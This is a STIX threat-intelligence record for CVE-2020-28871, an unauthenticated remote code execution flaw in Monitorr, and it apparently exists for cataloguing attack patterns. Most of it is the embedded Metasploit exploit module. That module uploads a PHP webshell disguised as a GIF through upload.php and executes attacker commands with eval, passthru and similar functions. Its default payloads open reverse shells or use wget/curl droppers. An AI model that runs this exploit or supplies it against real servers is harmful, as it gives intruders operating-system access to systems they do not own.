{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--349f0d66-af33-442a-a08b-3f522855c598",
    "created": "2024-08-14T17:11:52.132902Z",
    "modified": "2024-08-14T17:11:52.132906Z",
    "name": "Monitorr unauthenticated Remote Code Execution (RCE)",
    "description": " This module exploits an arbitrary file upload vulnerability and achieving an RCE in the Monitorr application. Using a specially crafted request, custom PHP code can be uploaded and injected through endpoint upload.php because of missing input validation. Any user privileges can exploit this vulnerability and it results in access to the underlying operating system with the same privileges under which the web services run (typically user www-data). Monitorr 1.7.6m, 1.7.7d and below are affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/monitorr_webshell_rce_cve_2020_28871.rb",
            "external_id": "monitorr_webshell_rce_cve_2020_28871.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-28871"
        },
        {
            "source_name": "reference",
            "url": "https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/UNlzoDVL3o/cve-2020-28871"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Monitorr unauthenticated Remote Code Execution (RCE)',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability and achieving an RCE in the Monitorr application.\n          Using a specially crafted request, custom PHP code can be uploaded and injected through endpoint upload.php because of missing input validation.\n          Any user privileges can exploit this vulnerability and it results in access to the underlying operating system with the same privileges\n          under which the web services run (typically user www-data).\n          Monitorr 1.7.6m, 1.7.7d and below are affected.\n        },\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module\n          'Lyhins Lab' # discovery\n        ],\n        'References' => [\n          [ 'CVE', '2020-28871' ],\n          [ 'URL', 'https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/' ],\n          [ 'URL', 'https://attackerkb.com/topics/UNlzoDVL3o/cve-2020-28871' ],\n          [ 'EDB', '48980' ],\n          [ 'PACKETSTORM', '163263' ],\n          [ 'PACKETSTORM', '170974' ]\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'unix', 'linux', 'win', 'php' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86 ],\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ ARCH_X64, ARCH_X86 ],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget', 'curl', 'printf', 'bourne' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_command,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows EXE Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-11-16',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 80\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The Monitorr endpoint URL', '/' ]),\n        OptString.new('WEBSHELL', [\n          false, 'The name of the webshell with extension to trick the parser like .phtml, .phar, etc. Webshell name will be randomly generated if left unset.', ''\n        ]),\n        OptEnum.new('COMMAND', [ true, 'Use PHP command function', 'passthru', [ 'passthru', 'shell_exec', 'system', 'exec' ]], conditions: %w[TARGET != 0])\n      ]\n    )\n  end\n\n  def upload_php_code(payload)\n    # Upload webshell hidden in a GIF with Metasploit payload code\n    # randomize file name if option WEBSHELL is not set. Use lowercase characters because upload stores file name in lowercase\n    if datastore['WEBSHELL'].blank?\n      @webshell_name = \"#{Rex::Text.rand_text_alpha_lower(8..16)}.php\"\n    else\n      @webshell_name = datastore['WEBSHELL'].to_s.downcase\n    end\n\n    # construct multipart form data\n    form_data = Rex::MIME::Message.new\n    form_data.add_part(payload.prepend(\"GIF89a#{rand_text_numeric(6..8)}\"), 'image/gif', 'binary', \"form-data; name=\\\"fileToUpload\\\"; filename=\\\"#{@webshell_name}\\\"\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'assets', 'php', 'upload.php'),\n      'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n      'data' => form_data.to_s\n    })\n    return false unless res && res.code == 200 && !res.body.blank?\n\n    # parse HTML response to find the id with value 'uploadok' that indicates a successful upload\n    html = res.get_html_document\n    !!html.at('div[@id=\"uploadok\"]')\n  end\n\n  def execute_command(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    php_cmd_function = Base64.strict_encode64(datastore['COMMAND'])\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'assets', 'data', 'usrimg', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        @get_param => php_cmd_function\n      },\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'assets', 'data', 'usrimg', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'assets', 'js', 'version', 'version.txt'),\n      'ctype' => 'application/x-www-form-urlencoded'\n    })\n    if res && res.code == 200 && !res.body.blank?\n      # version 0.8.6d is the first release where versioning using version.txt is introduced according the release notes.\n      version = Rex::Version.new(res.body)\n      return CheckCode::Vulnerable(\"Monitorr version: #{version}\") if version.between?(Rex::Version.new('0.8.6'), Rex::Version.new('1.7.7'))\n    end\n    CheckCode::Unknown\n  end\n\n  def exploit\n    # select webshell depending on the target setting (PHP or others).\n    # randomize and encode all parameters to obfuscate the payload and execution\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n    @get_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    if target['Type'] == :php\n      @webshell = \"<?php @eval(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    else\n      @webshell = \"<?=base64_decode($_GET[\\'#{@get_param}\\'])(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    fail_with(Failure::NotVulnerable, \"Webshell #{@webshell_name} upload failed, the system is likely patched.\") unless upload_php_code(@webshell)\n    register_file_for_cleanup(@webshell_name.to_s)\n\n    case target['Type']\n    when :php\n      execute_php(payload.encoded)\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 65536)\n    when :windows_command\n      execute_command(payload.encoded)\n    when :windows_dropper\n      execute_cmdstager(flavor: :psh_invokewebrequest, linemax: 65536)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-11-16",
    "x_mitre_platforms": [
        "win'"
    ]
}